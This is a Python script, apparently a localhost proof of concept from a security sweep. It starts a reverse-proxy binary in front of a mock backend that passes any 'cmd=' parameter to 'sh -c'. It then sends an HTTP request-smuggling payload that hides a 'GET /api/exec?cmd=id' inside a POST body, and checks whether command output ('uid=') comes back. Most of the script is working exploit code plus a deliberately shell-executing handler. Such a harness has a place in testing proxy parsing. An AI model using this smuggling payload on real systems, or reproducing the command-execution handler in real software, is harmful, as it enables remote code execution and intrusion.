import socket,subprocess,threading,sys,time,urllib.parse
def fp():
    s=socket.socket(); s.bind(("127.0.0.1",0)); p=s.getsockname()[1]; s.close(); return p
RAW=[]
def h(c):
    d=b"";c.settimeout(1.5)
    try:
        while b"\r\n\r\n" not in d:
            x=c.recv(8192)
            if not x: break
            d+=x
    except: pass
    RAW.append(d); body=b""
    for ln in d.split(b"\r\n"):
        t=urllib.parse.unquote(ln.decode("latin1"))
        if "cmd=" in t:
            body=subprocess.run(["sh","-c",t.split("cmd=")[1].split("&")[0].split(" ")[0]],capture_output=True).stdout; break
    try: c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: "+str(len(body)).encode()+b"\r\nConnection: close\r\n\r\n"+body)
    except: pass
    try: c.close()
    except: pass
def up(port,stop):
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("127.0.0.1",port)); s.listen(32); s.settimeout(0.1)
    while not stop.is_set():
        try: c,_=s.accept()
        except (socket.timeout,OSError): continue
        threading.Thread(target=h,args=(c,),daemon=True).start()
    s.close()
P="/home/mouse9911/gits/toksec/temp/rce-sweep2/www"
binp="/home/mouse9911/gits/toksec/temp/rce-sweep2/bin/terra2usd"
l=fp(); u=fp(); cf=f"/tmp/evtp_{l}.conf"
open(cf,"w").write(f"""worker_processes 1;
events {{ }}
http {{
  upstream backend {{ server 127.0.0.1:{u}; }}
  server {{
    listen 127.0.0.1:{l};
    server_name alpha.test;
    root {P}/alpha;
    location /api/ {{ proxy_pass http://backend/; }}
    location / {{ }}
  }}
}}
""")
stop=threading.Event(); threading.Thread(target=up,args=(u,stop),daemon=True).start(); time.sleep(0.2)
p=subprocess.Popen([binp,"--config",cf],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
for _ in range(100):
    time.sleep(0.05)
    try: socket.create_connection(("127.0.0.1",l),timeout=1).close(); break
    except: pass
body=b"GET /api/exec?cmd=id HTTP/1.1\r\nHost: alpha.test\r\n\r\n"
req=b"POST /api/x HTTP/1.1\r\nHost: alpha.test\r\nContent-Length: "+str(len(body)).encode()+b"\r\nConnection: keep-alive\r\n\r\n"+body+b"GET /api/hello HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n"
RAW.clear()
c=socket.create_connection(("127.0.0.1",l),timeout=3); c.settimeout(1.5); c.sendall(req)
b=b""
try:
    while True:
        x=c.recv(8192)
        if not x: break
        b+=x
except: pass
c.close()
print("client single write:",repr(req))
print("responses:",b.count(b"HTTP/1.1 "),"statuses:",[x[:15] for x in b.split(b"HTTP/1.1 ")[1:]])
print("upstream heads:",[r.split(b"\r\n")[0] for r in RAW])
print("uid returned:",b"uid=" in b)
p.terminate()
try: p.wait(timeout=2)
except: p.kill()
stop.set()
